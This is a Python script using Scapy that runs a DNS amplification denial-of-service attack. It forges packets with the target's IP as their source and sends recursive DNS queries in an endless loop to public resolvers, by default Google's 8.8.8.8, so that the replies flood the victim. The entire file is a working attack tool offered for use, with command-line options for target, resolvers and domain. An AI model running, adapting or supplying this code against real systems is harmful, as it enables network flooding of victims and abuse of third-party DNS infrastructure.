from scapy.all import DNS, DNSQR, IP, ICMP, RandShort, send, UDP
import argparse
import sys

g_target_ip = ""
g_name_servers = ["8.8.8.8"]	# Default; can be overwritten using -n flag
g_domain = "www.google.com" 	# Default; can be overwritten using -d flag


"""
	This function creates and sends spoofed DNS queries to a list of DNS resolver.
"""
def dns_amplification():
	global g_target_ip, g_name_servers, g_domain

	# Send the queries continuously to overwhelm the target network
	print("[*] Starting DNS amplification attack")

	while True:
		for name_server in g_name_servers:
			ip = IP(src = g_target_ip, dst = name_server)
			udp = UDP(sport=RandShort(), dport=53)
			dns = DNS(rd = 1,
					  qd = DNSQR(
					  		qname = g_domain,
					  		qtype = "A"		# Play around to see which one returns max answer length
							)
					)

			# Create the spoofed DNS query and send it
			pkt = ip/udp/dns
			send(pkt, verbose = False)


"""
	This function adds user defined DNS resolvers to the list of resolvers to be queried.
"""
def append_dns_ips(dns_ips):
	global g_name_servers
	for specific_ip in dns_ips:
		if not specific_ip in g_name_servers:
			g_name_servers.append(specific_ip)


def main():
	global g_target_ip, g_name_servers, g_domain

	# Get the args
	parser = argparse.ArgumentParser()
	parser.add_argument("-t", help="Specify the target's IP")
	parser.add_argument("-n", nargs="+", type=int, help="Specify the list of additional DNS Servers")
	parser.add_argument("-d", help="Specify the domain to be queried")

	args = parser.parse_args()

	g_target_ip = args.t

	if (g_target_ip == None):
		sys.exit("[#] Please specify the target's IP address.\n[#] Exiting")
	if (args.n != None):
		append_dns_ips(args.n)
	if (args.d != None):
		g_domain = args.d

	print("[*] Target IP: ", g_target_ip)
	print("[*] DNS Server: ", g_name_servers)
	print("[*] Domain: ", g_domain)

	dns_amplification()

if __name__ == "__main__":
	main()